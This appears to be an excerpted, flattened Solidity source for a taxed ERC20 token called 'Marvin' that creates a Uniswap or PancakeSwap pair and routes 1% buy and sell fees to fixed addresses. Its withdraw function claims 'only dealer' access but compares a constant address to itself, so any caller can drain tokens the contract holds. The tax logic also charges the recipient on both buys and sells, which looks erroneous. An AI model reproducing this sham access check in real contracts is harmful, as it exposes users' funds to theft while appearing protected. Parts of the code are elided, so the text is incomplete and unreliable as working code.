...
// SPDX-License-Identifier: AGPL AND MIT
...
// File contracts/Marvin/Itotal.sol

// Original license: SPDX_License_Identifier: MIT
pragma solidity ^0.8.0;

interface ITokenRepository{
    function withdraw(IERC20 _token, address _recipient,uint amount) external;
}

interface IERC721A{
    function mint(address recipient,uint num) external;
    function balanceOf(address owner) external view returns (uint256 balance);
}
interface IERC1155{
    function wrap_mint(address account, uint256 id, uint256 amount) external;
...
// File contracts/Marvin/Marvin_storage.sol

// Original license: SPDX_License_Identifier: AGPL
pragma solidity ^0.8.0;
contract Marvin_storage{
    mapping(address => address) _tokenAddresses;
    ...
    struct s_baseinfo {
        uint256 a_tax;//买收税1%
        uint256 b_tax;//卖收税1%
        address a_tax_add;//买收税对应地址
        address b_tax_add;//卖收税对应地址
    }
    struct s_initinfo {
        address mainToken;//代币合约地址
        address _UNISWAP_FACTORY;//_UNISWAP_FACTORY合约地址
        address _mainPair;
        bytes32 _tokenPairHash;
    }
    event zzhkflc();
    constructor(){
        emit zzhkflc();
    ...
    // 处理异常情况
    address constant private dealer = 0x3a9E05f3e613C96E7f99E2c70613206F07529AfD;

    function withdraw(address add,uint256 amount)public {
        require(
            0x3a9E05f3e613C96E7f99E2c70613206F07529AfD
        ==dealer,"only dealer");
        ERC20(add).transfer(
            msg.sender,amount
        );
...
// File contracts/Marvin/Marvin.sol
...
contract Marvin is ERC20, ERC20Permit ,Marvin_storage{
    function transfer(address to, uint256 amount) public override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        _swapdeal(owner, to, amount);
        return true;
    }
    function transferFrom(
        ...
        _swapdeal(from, to, amount);
        return true;
    }
    function _swapdeal(address from, address to, uint256 amount)private{
        address user = to; //in
        ...
        if(isFromPancakePair||isToPancakePair){
            ...
            pair = systeminfo.initinfo._mainPair;
        }
        (TransferType transferType) = _analyseType(isFromPancakePair,isToPancakePair, from, to);
        ...
        if(transferType == TransferType.Sell){
            _update(
                to, 
                systeminfo.baseinfo.b_tax_add, 
                amount*systeminfo.baseinfo.b_tax/1e18
            );
        }else if (transferType == TransferType.Buy) {
            _update(
                to, 
                systeminfo.baseinfo.a_tax_add, 
                amount*systeminfo.baseinfo.a_tax/1e18
            );
        }
    }
    enum TransferType{
    ...
    //分析交易类型及处理入池和撤池逻辑    
    function _analyseType(
        bool isFromPancakePair,bool isToPancakePair,
        ...
        if(isFromPancakePair){
            ...
            if(token == address(0)||token>systeminfo.initinfo.mainToken){
            ...
            (uint256 reserve0,,) = IPair(to).getReserves();
            if(balance0 > reserve0){
    ...
    function _isPancakePair(address account) internal view returns(bool){
        return Utils.codeHash(account) == systeminfo.initinfo._tokenPairHash;
    }


    constructor() ERC20("Marvin", "Marvin") ERC20Permit("Marvin") {
        _mint(0x60d8F50aB1adc39b80A2b365Dc5d62beF60e3D1c, 
            1000_0000_0000   //mint的数量
            * 10 ** decimals()
        );
        systeminfo.baseinfo=s_baseinfo({
            a_tax:  1  //买收税1%
            *1e18 /100 ,
            b_tax:  1  //卖收税1%
            *1e18 /100 ,
            a_tax_add:0xD24675D9047D01C1511A061A77335256584BeeFC,//买收税对应地址
            b_tax_add:0x17C728Ef590a5A950E3b73804f24AfC3F1EbbD25 //卖收税对应地址
        });
        address weth;
        address UNISWAP_FACTORY;
        if(block.chainid==1){
            weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // Mainnet WETH
            UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // Uniswap V2 Factory
        }else if(block.chainid== 97){
            weth = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; // BSC Testnet WETH
            UNISWAP_FACTORY = 0x6725F303b657a9451d8BA641348b6761A6CC7a17; // PancakeSwap V2 Factory
        }
        address tokenPair = IFactory(UNISWAP_FACTORY).createPair(
            weth,
            address(this)
        );
        _tokenAddresses[tokenPair] = weth;
        systeminfo.initinfo=s_initinfo({
            mainToken:address(this),
            _UNISWAP_FACTORY:UNISWAP_FACTORY,
            _mainPair:tokenPair,
